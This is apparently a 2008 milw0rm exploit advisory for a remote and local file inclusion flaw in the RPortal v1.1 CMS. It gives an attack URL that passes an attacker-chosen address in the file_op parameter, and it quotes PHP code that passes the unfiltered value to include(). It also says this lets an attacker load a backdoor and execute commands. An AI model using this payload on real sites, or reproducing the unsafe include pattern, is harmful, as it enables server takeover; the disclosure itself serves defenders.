@@ -1,0 +1,52 @@
+#########################################################
+#
+# RPortal v1.1
+#
+#
+# Rportal is a management system of contents simple and powerful Web,
+# enabling you to create your site in a few minutes, while profiting
+# from a complete and effective administration.
+#
+#
+# Remote and Local File Inclusion Vulnerability <= 1.1
+# Found the 29th September 2008
+
+##########################################################
+# Author: Kad
+#
+# mail : kadfrox [ a ] gmail [ dot ] com
+#
+##########################################################
+#
+# script : RPortal v 1.1
+# http://www.rportal.org/?op=download&fid=36
+#
+##########################################################
+
+[~] Exploit :
+
+
+http://www.site.com/index.php?file_op=[url]
+
+#
+# Vulnerable code source :
+#
+
+if(!isset($file_op))$file_op='';
+
+if($file_op!="")
+
+{
+    $op_basepath = trim(strrev(strstr(strrev($file_op),"/php/")));
+
+    if($op_basepath!='') $op_basepath = str_replace("/php/", "/", $op_basepath);
+
+    include($file_op);
+
+}
+
+# The problem is that the variable $file_op is not filtered
+# Then, you can put the link that you want, like your own backdoor
+# and execute commands.
+
+# milw0rm.com [2008-10-01]
